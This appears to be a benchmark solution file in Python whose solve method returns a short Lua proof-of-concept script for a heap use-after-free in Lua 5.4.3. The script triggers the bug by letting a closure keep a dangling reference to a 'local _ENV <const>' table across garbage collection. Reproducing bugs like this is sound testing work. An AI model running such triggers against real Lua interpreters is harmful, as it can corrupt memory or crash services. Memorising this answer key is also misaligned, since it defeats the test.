import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal PoC for Lua 5.4.3 Heap Use-After-Free vulnerability (arvo:44597)
        # related to 'local _ENV <const>'.
        # The bug allows a closure to hold a dangling reference to the _ENV table
        # after it has been collected.
        return b"""
local function f()
  local _ENV <const> = {x = 1}
  return function() return x end
end
local g = f()
collectgarbage()
g()
"""